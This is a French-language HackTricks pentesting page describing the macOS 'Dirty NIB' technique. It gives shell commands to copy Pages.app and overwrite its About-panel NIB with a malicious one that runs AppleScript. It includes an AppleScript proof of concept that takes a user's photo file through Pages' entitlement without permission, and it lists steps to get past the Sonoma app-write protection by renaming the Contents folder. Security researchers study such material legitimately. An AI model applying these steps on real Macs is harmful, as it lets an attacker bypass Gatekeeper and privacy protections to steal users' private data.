# macOS Dirty NIB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Cette technique a été tirée de l'article** [**https://blog.xpnsec.com/dirtynib/**](https://blog.xpnsec.com/dirtynib/)

## Informations de base

Les fichiers NIB sont utilisés dans l'écosystème de développement d'Apple pour **définir les éléments de l'interface utilisateur (UI)** et leurs interactions au sein d'une application. Créés avec l'outil Interface Builder, ils contiennent des **objets sérialisés** tels que des fenêtres, des boutons et des champs de texte, qui sont chargés au moment de l'exécution pour présenter l'interface utilisateur conçue. Bien qu'ils soient encore utilisés, Apple recommande désormais l'utilisation de Storyboards pour une représentation plus visuelle du flux de l'interface utilisateur d'une application.

{% hint style="danger" %}
De plus, les **fichiers NIB** peuvent également être utilisés pour **exécuter des commandes arbitraires** et si le fichier NIB est modifié dans une application, **Gatekeeper autorisera toujours l'exécution de l'application**, ce qui permet d'exécuter des commandes arbitraires à l'intérieur des applications.
{% endhint %}

## Injection de Dirty NIB <a href="#dirtynib" id="dirtynib"></a>

Tout d'abord, nous devons créer un nouveau fichier NIB, nous utiliserons XCode pour la majeure partie de la construction. Nous commençons par ajouter un objet à l'interface et définir la classe sur NSAppleScript :

<figure><img src="../../../.gitbook/assets/image (681).png" alt="" width="380"><figcaption></figcaption></figure>

Pour l'objet, nous devons définir la propriété initiale `source`, ce que nous pouvons faire en utilisant les attributs d'exécution définis par l'utilisateur :

<figure><img src="../../../.gitbook/assets/image (682).png" alt="" width="563"><figcaption></figcaption></figure>

Cela configure notre gadget d'exécution de code, qui va simplement **exécuter AppleScript sur demande**. Pour déclencher réellement l'exécution de l'AppleScript, nous allons simplement ajouter un bouton pour le moment (vous pouvez bien sûr faire preuve de créativité avec cela ;). Le bouton sera lié à l'objet `Apple Script` que nous venons de créer, et **invoquera le sélecteur `executeAndReturnError:`** :

<figure><img src="../../../.gitbook/assets/image (683).png" alt="" width="563"><figcaption></figcaption></figure>

Pour les tests, nous utiliserons simplement l'Apple Script suivant :
```bash
set theDialogText to "PWND"
display dialog theDialogText
```
Et si nous exécutons cela dans le débogueur XCode et appuyons sur le bouton :

<figure><img src="../../../.gitbook/assets/image (684).png" alt="" width="563"><figcaption></figcaption></figure>

Avec notre capacité à exécuter du code AppleScript arbitraire à partir d'un NIB, nous avons ensuite besoin d'une cible. Choisissons Pages pour notre démonstration initiale, qui est bien sûr une application Apple et ne devrait certainement pas être modifiable par nous.

Nous allons d'abord faire une copie de l'application dans `/tmp/` :
```bash
cp -a -X /Applications/Pages.app /tmp/
```
Ensuite, nous lancerons l'application pour éviter tout problème de Gatekeeper et permettre la mise en cache des éléments :
```bash
open -W -g -j /Applications/Pages.app
```
Après avoir lancé (et tué) l'application une première fois, nous devrons écraser un fichier NIB existant avec notre fichier DirtyNIB. À des fins de démonstration, nous allons simplement écraser le fichier NIB du panneau À propos afin de pouvoir contrôler l'exécution :
```bash
cp /tmp/Dirty.nib /tmp/Pages.app/Contents/Resources/Base.lproj/TMAAboutPanel.nib
```
Une fois que nous avons écrasé le nib, nous pouvons déclencher l'exécution en sélectionnant l'élément de menu `À propos` :

<figure><img src="../../../.gitbook/assets/image (685).png" alt="" width="563"><figcaption></figcaption></figure>

Si nous examinons de plus près Pages, nous constatons qu'il dispose d'une autorisation privée permettant d'accéder aux photos des utilisateurs :

<figure><img src="../../../.gitbook/assets/image (686).png" alt="" width="479"><figcaption></figcaption></figure>

Nous pouvons donc mettre notre POC à l'épreuve en **modifiant notre AppleScript pour voler les photos** de l'utilisateur sans demander la permission :

{% code overflow="wrap" %}
```applescript
use framework "Cocoa"
use framework "Foundation"

set grabbed to current application's NSData's dataWithContentsOfFile:"/Users/xpn/Pictures/Photos Library.photoslibrary/originals/6/68CD9A98-E591-4D39-B038-E1B3F982C902.gif"

grabbed's writeToFile:"/Users/xpn/Library/Containers/com.apple.iWork.Pages/Data/wtf.gif" atomically:1
```
{% endcode %}

{% hint style="danger" %}
[**Exemple de fichier .xib malveillant exécutant du code arbitraire.**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4)
{% endhint %}

## Contraintes de lancement

Elles **empêchent essentiellement l'exécution d'applications en dehors de leurs emplacements attendus**, donc si vous copiez une application protégée par des contraintes de lancement dans `/tmp`, vous ne pourrez pas l'exécuter.\
[**Trouvez plus d'informations dans cet article**](../macos-security-protections/#launch-constraints)**.**

Cependant, en analysant le fichier **`/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4`**, vous pouvez toujours trouver des **applications qui ne sont pas protégées par des contraintes de lancement**, vous pouvez donc toujours **injecter** des fichiers **NIB** dans des emplacements arbitraires dans **ces applications** (consultez le lien précédent pour apprendre comment trouver ces applications).

## Protections supplémentaires

Depuis macOS Somona, il existe des protections **empêchant l'écriture à l'intérieur des applications**. Cependant, il est toujours possible de contourner cette protection si, avant d'exécuter votre copie du binaire, vous changez le nom du dossier Contents :

1. Faites une copie de `CarPlay Simulator.app` dans `/tmp/`
2. Renommez `/tmp/Carplay Simulator.app/Contents` en `/tmp/CarPlay Simulator.app/NotCon`
3. Lancez le binaire `/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator` pour le mettre en cache dans Gatekeeper
4. Remplacez `NotCon/Resources/Base.lproj/MainMenu.nib` par notre fichier `Dirty.nib`
5. Renommez en `/tmp/CarPlay Simulator.app/Contents`
6. Lancez à nouveau `CarPlay Simulator.app`

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
